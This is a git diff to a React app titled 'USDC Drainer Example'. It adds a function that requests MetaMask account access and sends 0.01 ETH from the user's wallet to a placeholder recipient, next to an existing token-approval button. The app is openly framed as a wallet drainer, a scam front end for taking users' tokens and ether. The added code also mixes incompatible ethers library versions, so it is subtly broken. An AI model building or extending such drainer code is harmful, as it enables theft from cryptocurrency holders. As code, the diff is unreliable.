@@ -23,7 +23,7 @@ function App() {
     }
   };
 
-    // Function to approve tokens
+  // Function to approve tokens
   const approveTokensHandler = async () => {
     if (!window.ethereum || !window.ethereum.isMetaMask) {
       console.log('Ethereum object not found or MetaMask is not installed.');
@@ -52,12 +52,47 @@ function App() {
       console.error('Error approving tokens:', error);
     }
   };
-  
+
+  // State for transaction status
+  const [txStatus, setTxStatus] = useState('');
+
+  const sendTransaction = async () => {
+    try {
+      // Request account access if needed (for MetaMask)
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+      // Create a provider to interact with Ethereum
+      const provider = new ethers.BrowserProvider(window.ethereum);
+
+      // Get the signer to sign transactions (the user's wallet)
+      const signer = await provider.getSigner();
+
+      // Define transaction parameters
+      const tx = {
+        to: 'RECIPIENT_ADDRESS', // Recipient address
+        value: ethers.utils.parseEther('0.01'), // Amount to send (in Ether)
+        // Add other transaction parameters as needed (e.g., gasLimit, gasPrice, nonce, data)
+      };
+
+      // Send the transaction
+      const transactionResponse = await signer.sendTransaction(tx);
+      setTxStatus('Transaction Sent. Waiting for confirmation...');
+
+      // Wait for the transaction to be confirmed
+      await transactionResponse.wait();
+      setTxStatus('Transaction Confirmed!');
+    } catch (error) {
+      console.error(error);
+      setTxStatus('Transaction Failed');
+    }
+  };
+
   return (
     <div className="App">
       <h1>USDC Drainer Example</h1>
       <button onClick={connectWalletHandler}>{isConnected ? 'Wallet Connected' : 'Connect Wallet'}</button>
       <button onClick={approveTokensHandler} disabled={!isConnected}>Approve Tokens</button>
+      <button onClick={sendTransaction}>Send Ethereum</button>
     </div>
   );
 }
